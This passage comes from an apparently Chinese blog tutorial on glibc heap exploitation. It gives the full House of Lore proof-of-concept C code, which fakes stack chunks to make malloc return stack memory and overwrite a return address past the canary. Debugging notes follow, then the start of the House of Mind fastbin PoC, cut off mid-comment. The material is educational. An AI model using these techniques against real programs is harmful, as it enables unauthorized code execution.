<h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-14"><a href="#调试-14" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201716247.png"
                      alt="image-20231012201716247"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201759897.png"
                      alt="image-20231012201759897"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201828914.png"
                      alt="image-20231012201828914"
                ></p>
<p>首先申请一个 <code>0x110</code>大小的堆块，然后布置栈上两个 <code>stack_buffer</code> 结构，即 <code>stack1_fd-&gt;small_chunk</code>，<code>stack1_bk-&gt;stack2_prev</code> ，<code>stack2_fd-&gt;stack1_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211308891.png"
                      alt="image-20231012211308891"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211034680.png"
                      alt="image-20231012211034680"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211530114.png"
                      alt="image-20231012211530114"
                ></p>
<p>申请<code>0x3f0</code> 大小的 <code>chunk</code> 隔离 <code>top_chunk</code> ，然后将 <code>0x111</code> 的 <code>chunk</code> 放进 <code>unsorted_bin</code> ，申请 <code>（large_chunk）0x4c0</code> 大小的 <code>chunk</code> 触发 <code>consolidate</code> 机制再次将其再次放入 <code>small_bin</code> 中，并修改其 <code>bk-&gt;stack1_prev</code>。</p>
<p>此时：</p>
<p>FD：<code>stack2_fd-&gt;stack1_prev;stack1_fd-&gt;small_chunk_fd;</code></p>
<p>BK：<code>small_chunk_bk-&gt;stack1_prev;stack1_bk-&gt;stack2_prev;</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第二种情况，small bin 中存在空闲的 chunk。</span></span><br><span class="line"><span class="comment">// 找到倒数第二个 chunk(small_chunk)-&gt;bk。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line"><span class="built_in">set_inuse_bit_at_offset</span>(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure></div>

<p>然后再次申请两个用户区为 <code>0x100</code>大小的 <code>chunk</code>，第一次申请时绕过以上验证，此时 <code>bck(stack1)_fd-&gt;small_chunk。</code>，第二次申请同理，要取出 <code>victim=stack1</code> ，此时 <code>stack_2_fd-&gt;stack_1_prev; stack1_bk-&gt;stack2_prev</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085422164.png"
                      alt="image-20231013085422164"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085545532.png"
                      alt="image-20231013085545532"
                ></p>
<p>然后申请两次 <code>0x110</code> 大小的 <code>chunk</code>，分别为 <code>p3</code> <code>p4</code>，会将 <code>small_chunk</code>  和 <code>stack1</code> 取出来，然后覆盖 <code>main</code> 返回地址为目标函数地址即可完成任意地址写。</p>
<h2 id="house-of-mind-fastbin"><a href="#house-of-mind-fastbin" class="headerlink" title="house_of_mind_fastbin"></a>house_of_mind_fastbin</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- 